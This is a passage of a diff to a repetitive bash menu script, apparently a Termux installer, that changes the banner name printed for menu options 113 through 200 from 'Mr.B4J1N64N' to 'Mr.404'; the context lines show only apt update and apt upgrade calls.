 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2000,7 +2000,7 @@ fi
 if [ $bro = 114 ] || [ $bro = 114 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2015,7 +2015,7 @@ fi
 if [ $bro = 115 ] || [ $bro = 115 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2029,7 +2029,7 @@ fi
 if [ $bro = 116 ] || [ $bro = 116 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2043,7 +2043,7 @@ fi
 if [ $bro = 117 ] || [ $bro = 117 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2058,7 +2058,7 @@ fi
 if [ $bro = 118 ] || [ $bro = 118 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2073,7 +2073,7 @@ fi
 if [ $bro = 119 ] || [ $bro = 119 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2088,7 +2088,7 @@ fi
 if [ $bro = 120 ] || [ $bro = 120 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2105,7 +2105,7 @@ fi
 if [ $bro = 121 ] || [ $bro = 121 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2120,7 +2120,7 @@ fi
 if [ $bro = 122 ] || [ $bro = 122 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2135,7 +2135,7 @@ fi
 if [ $bro = 123 ] || [ $bro = 123 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2149,7 +2149,7 @@ fi
 if [ $bro = 124 ] || [ $bro = 124 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2163,7 +2163,7 @@ fi
 if [ $bro = 125 ] || [ $bro = 125 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2179,7 +2179,7 @@ fi
 if [ $bro = 126 ] || [ $bro = 126 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2194,7 +2194,7 @@ fi
 if [ $bro = 127 ] || [ $bro = 127 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2210,7 +2210,7 @@ fi
 if [ $bro = 128 ] || [ $bro = 128 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2226,7 +2226,7 @@ fi
 if [ $bro = 129 ] || [ $bro = 129 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2242,7 +2242,7 @@ fi
 if [ $bro = 130 ] || [ $bro = 130 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2258,7 +2258,7 @@ fi
 if [ $bro = 131 ] || [ $bro = 131 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2272,7 +2272,7 @@ fi
 if [ $bro = 132 ] || [ $bro = 132 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2287,7 +2287,7 @@ fi
 if [ $bro = 133 ] || [ $bro = 133 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2301,7 +2301,7 @@ fi
 if [ $bro = 134 ] || [ $bro = 134 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2315,7 +2315,7 @@ fi
 if [ $bro = 135 ] || [ $bro = 135 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2330,7 +2330,7 @@ fi
 if [ $bro = 136 ] || [ $bro = 136 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2345,7 +2345,7 @@ fi
 if [ $bro = 137 ] || [ $bro = 137 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2360,7 +2360,7 @@ fi
 if [ $bro = 138 ] || [ $bro = 138 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2374,7 +2374,7 @@ fi
 if [ $bro = 139 ] || [ $bro = 139 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2388,7 +2388,7 @@ fi
 if [ $bro = 140 ] || [ $bro = 140 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2403,7 +2403,7 @@ fi
 if [ $bro = 141 ] || [ $bro = 141 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2418,7 +2418,7 @@ fi
 if [ $bro = 142 ] || [ $bro = 142 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2433,7 +2433,7 @@ fi
 if [ $bro = 143 ] || [ $bro = 143 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2448,7 +2448,7 @@ fi
 if [ $bro = 144 ] || [ $bro = 144 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2463,7 +2463,7 @@ fi
 if [ $bro = 145 ] || [ $bro = 145 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2478,7 +2478,7 @@ fi
 if [ $bro = 146 ] || [ $bro = 146 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2494,7 +2494,7 @@ fi
 if [ $bro = 147 ] || [ $bro = 147 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2508,7 +2508,7 @@ fi
 if [ $bro = 148 ] || [ $bro = 148 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2524,7 +2524,7 @@ fi
 if [ $bro = 149 ] || [ $bro = 149 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2540,7 +2540,7 @@ fi
 if [ $bro = 150 ] || [ $bro = 150 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2555,7 +2555,7 @@ fi
 if [ $bro = 151 ] || [ $bro = 151 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2570,7 +2570,7 @@ fi
 if [ $bro = 152 ] || [ $bro = 152 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2585,7 +2585,7 @@ fi
 if [ $bro = 153 ] || [ $bro = 153 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2600,7 +2600,7 @@ fi
 if [ $bro = 154 ] || [ $bro = 154 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2615,7 +2615,7 @@ fi
 if [ $bro = 155 ] || [ $bro = 155 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2630,7 +2630,7 @@ fi
 if [ $bro = 156 ] || [ $bro = 156 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2645,7 +2645,7 @@ fi
 if [ $bro = 157 ] || [ $bro = 157 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2660,7 +2660,7 @@ fi
 if [ $bro = 158 ] || [ $bro = 158 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2675,7 +2675,7 @@ fi
 if [ $bro = 159 ] || [ $bro = 159 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2688,7 +2688,7 @@ fi
 if [ $bro = 160 ] || [ $bro = 160 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2705,7 +2705,7 @@ fi
 if [ $bro = 161 ] || [ $bro = 161 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2720,7 +2720,7 @@ fi
 if [ $bro = 162 ] || [ $bro = 162 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2736,7 +2736,7 @@ fi
 if [ $bro = 163 ] || [ $bro = 163 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2751,7 +2751,7 @@ fi
 if [ $bro = 164 ] || [ $bro = 164 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2766,7 +2766,7 @@ fi
 if [ $bro = 165 ] || [ $bro = 165 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2781,7 +2781,7 @@ fi
 if [ $bro = 166 ] || [ $bro = 166 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2796,7 +2796,7 @@ fi
 if [ $bro = 167 ] || [ $bro = 167 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2811,7 +2811,7 @@ fi
 if [ $bro = 168 ] || [ $bro = 168 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2826,7 +2826,7 @@ fi
 if [ $bro = 169 ] || [ $bro = 169 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2841,7 +2841,7 @@ fi
 if [ $bro = 170 ] || [ $bro = 170 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2856,7 +2856,7 @@ fi
 if [ $bro = 171 ] || [ $bro = 171 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2871,7 +2871,7 @@ fi
 if [ $bro = 172 ] || [ $bro = 172 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2888,7 +2888,7 @@ fi
 if [ $bro = 173 ] || [ $bro = 173 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2905,7 +2905,7 @@ fi
 if [ $bro = 174 ] || [ $bro = 174 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2920,7 +2920,7 @@ fi
 if [ $bro = 175 ] || [ $bro = 175 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2934,7 +2934,7 @@ fi
 if [ $bro = 176 ] || [ $bro = 176 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2948,7 +2948,7 @@ fi
 if [ $bro = 177 ] || [ $bro = 177 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2964,7 +2964,7 @@ fi
 if [ $bro = 178 ] || [ $bro = 178 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2980,7 +2980,7 @@ fi
 if [ $bro = 179 ] || [ $bro = 179 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -2995,7 +2995,7 @@ fi
 if [ $bro = 180 ] || [ $bro = 180 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3010,7 +3010,7 @@ fi
 if [ $bro = 181 ] || [ $bro = 181 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3025,7 +3025,7 @@ fi
 if [ $bro = 182 ] || [ $bro = 182 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3040,7 +3040,7 @@ fi
 if [ $bro = 183 ] || [ $bro = 183 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3055,7 +3055,7 @@ fi
 if [ $bro = 184 ] || [ $bro = 184 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3070,7 +3070,7 @@ fi
 if [ $bro = 185 ] || [ $bro = 185 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3085,7 +3085,7 @@ fi
 if [ $bro = 186 ] || [ $bro = 186 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3100,7 +3100,7 @@ fi
 if [ $bro = 187 ] || [ $bro = 187 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3115,7 +3115,7 @@ fi
 if [ $bro = 188 ] || [ $bro = 188 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3130,7 +3130,7 @@ fi
 if [ $bro = 189 ] || [ $bro = 189 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3145,7 +3145,7 @@ fi
 if [ $bro = 190 ] || [ $bro = 190 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3166,7 +3166,7 @@ fi
 if [ $bro = 191 ] || [ $bro = 191 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3181,7 +3181,7 @@ fi
 if [ $bro = 192 ] || [ $bro = 192 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3197,7 +3197,7 @@ fi
 if [ $bro = 193 ] || [ $bro = 193 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3212,7 +3212,7 @@ fi
 if [ $bro = 194 ] || [ $bro = 194 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3227,7 +3227,7 @@ fi
 if [ $bro = 195 ] || [ $bro = 195 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3242,7 +3242,7 @@ fi
 if [ $bro = 196 ] || [ $bro = 196 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3257,7 +3257,7 @@ fi
 if [ $bro = 197 ] || [ $bro = 197 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3272,7 +3272,7 @@ fi
 if [ $bro = 198 ] || [ $bro = 198 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3287,7 +3287,7 @@ fi
 if [ $bro = 199 ] || [ $bro = 199 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
@@ -3302,7 +3302,7 @@ fi
 if [ $bro = 200 ] || [ $bro = 200 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.404"
 sleep 1
 apt update 
 apt upgrade
